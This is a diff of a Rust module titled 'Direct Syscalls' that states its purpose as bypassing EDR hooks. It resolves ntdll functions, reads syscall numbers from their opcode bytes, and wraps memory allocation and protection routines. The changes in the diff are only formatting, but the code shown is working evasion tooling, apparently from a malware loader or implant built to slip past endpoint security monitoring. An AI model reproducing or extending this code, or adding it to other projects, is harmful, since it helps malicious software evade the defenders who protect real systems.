@@ -1,10 +1,10 @@
 // Direct Syscalls
 // Bypass EDR hooks by making direct system calls to the kernel
 
-use winapi::um::winnt::*;
-use winapi::shared::ntdef::*;
-use winapi::shared::basetsd::*;
 use std::ptr;
+use winapi::shared::basetsd::*;
+use winapi::shared::ntdef::*;
+use winapi::um::winnt::*;
 
 // Syscall numbers for Windows 10/11 (x64)
 // Note: These vary by Windows version - this is a baseline
@@ -47,32 +47,28 @@ pub unsafe extern "system" fn syscall_stub() {
 /// Get syscall number dynamically from ntdll
 pub unsafe fn get_syscall_number(function_name: &str) -> Option<u32> {
     use crate::api_resolver::resolve_api;
-    
+
     // Resolve Nt* function from ntdll
     let func_addr = resolve_api("ntdll.dll", function_name)?;
-    
+
     // Read first bytes to extract syscall number
     // x64: mov r10, rcx; mov eax, <syscall_num>; syscall
     // Pattern: 4C 8B D1 B8 <num> 00 00 00 0F 05
     let bytes = std::slice::from_raw_parts(func_addr as *const u8, 16);
-    
+
     #[cfg(target_arch = "x86_64")]
     {
         // Look for: mov eax, <syscall_num> (B8 <num> <num> <num> <num>)
         for i in 0..bytes.len().saturating_sub(4) {
             if bytes[i] == 0xB8 {
                 // Extract syscall number (little endian)
-                let syscall_num = u32::from_le_bytes([
-                    bytes[i + 1],
-                    bytes[i + 2],
-                    bytes[i + 3],
-                    bytes[i + 4],
-                ]);
+                let syscall_num =
+                    u32::from_le_bytes([bytes[i + 1], bytes[i + 2], bytes[i + 3], bytes[i + 4]]);
                 return Some(syscall_num);
             }
         }
     }
-    
+
     None
 }
 
@@ -90,12 +86,7 @@ pub unsafe fn sys_nt_allocate_virtual_memory(
     // For now, fallback to API call
     // Full syscall implementation requires proper stack handling
     use winapi::um::memoryapi::VirtualAlloc;
-    let addr = VirtualAlloc(
-        *base_address,
-        *size,
-        allocation_type,
-        protect,
-    );
+    let addr = VirtualAlloc(*base_address, *size, allocation_type, protect);
     if !addr.is_null() {
         *base_address = addr;
         0 // STATUS_SUCCESS
@@ -132,7 +123,7 @@ pub unsafe fn sys_nt_protect_virtual_memory(
         );
         result
     }
-    
+
     #[cfg(target_arch = "x86")]
     {
         let syscall_num = SYSCALL_NT_PROTECT_VIRTUAL_MEMORY;
@@ -147,7 +138,7 @@ pub unsafe fn sys_nt_protect_virtual_memory(
         );
         result
     }
-    
+
     #[cfg(not(any(target_arch = "x86", target_arch = "x86_64")))]
     {
         0xC0000001 // STATUS_UNSUCCESSFUL
@@ -162,11 +153,11 @@ pub unsafe fn sys_allocate_memory(
     protect: u32,
 ) -> *mut winapi::ctypes::c_void {
     use winapi::um::processthreadsapi::GetCurrentProcess;
-    
+
     let process = GetCurrentProcess();
     let mut base_address = address;
     let mut size_mut = size;
-    
+
     let status = sys_nt_allocate_virtual_memory(
         process,
         &mut base_address,
@@ -175,7 +166,7 @@ pub unsafe fn sys_allocate_memory(
         allocation_type,
         protect,
     );
-    
+
     if status >= 0 {
         base_address
     } else {
@@ -193,11 +184,6 @@ pub unsafe fn sys_protect_memory(
     // Try to unhook first, then use API
     // In future, can switch to full syscall implementation
     use winapi::um::memoryapi::VirtualProtect;
-    
-    VirtualProtect(
-        address,
-        size,
-        new_protect,
-        old_protect,
-    ) != 0
+
+    VirtualProtect(address, size, new_protect, old_protect) != 0
 }
